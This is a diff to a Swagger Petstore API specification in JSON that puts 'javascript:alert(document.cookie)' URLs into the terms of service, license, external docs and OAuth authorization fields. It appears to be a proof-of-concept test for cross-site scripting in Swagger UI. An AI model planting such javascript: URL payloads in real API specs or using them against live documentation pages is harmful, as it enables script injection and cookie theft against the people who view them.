@@ -1,16 +1,16 @@
 {
 "swagger": "2.0",
 "info": {
-"description": "This is a sample server Petstore server.  You can find out more about Swagger at [javascript:alert(document.domain)](javascript:alert(document.domain)) or on [irc.freenode.net, #swagger](javascript:alert(document.domain)).  For this sample, you can use the api key `special-key` to test the authorization filters.",
+"description": "This is a sample server Petstore server.  You can find out more about Swagger at [javascript:alert(document.cookie)](javascript:alert(document.cookie)) or on [irc.freenode.net, #swagger](javascript:alert(document.domain)).  For this sample, you can use the api key `special-key` to test the authorization filters.",
 "version": "1.0.6",
 "title": "Swagger Petstore",
-"termsOfService": "javascript:alert(document.domain)",
+"termsOfService": "javascript:alert(document.cookie)",
 "contact": {
 "email": "apiteam@swagger.io"
 },
 "license": {
 "name": "Apache 2.0",
-"url": "http://www.apache.org/licenses/LICENSE-2.0.html"
+"url": "javascript:alert(document.cookie);\""
 }
 },
 "host": "petstore.swagger.io",
@@ -21,7 +21,7 @@
 "description": "Everything about your Pets",
 "externalDocs": {
 "description": "Find out more",
-"url": "javascript:alert(document.domain)"
+"url": "javascript:alert(document.cookie)"
 }
 },
 {
@@ -33,7 +33,7 @@
 "description": "Operations about user",
 "externalDocs": {
 "description": "Find out more about our store",
-"url": "javascript:alert(document.domain)"
+"url": "javascript:alert(document.cookie)"
 }
 }
 ],
@@ -865,7 +865,7 @@
 },
 "petstore_auth": {
 "type": "oauth2",
-"authorizationUrl": "https://petstore.swagger.io/oauth/authorize",
+"authorizationUrl": "javascript:alert(document.cookie)",
 "flow": "implicit",
 "scopes": {
 "read:pets": "read your pets",
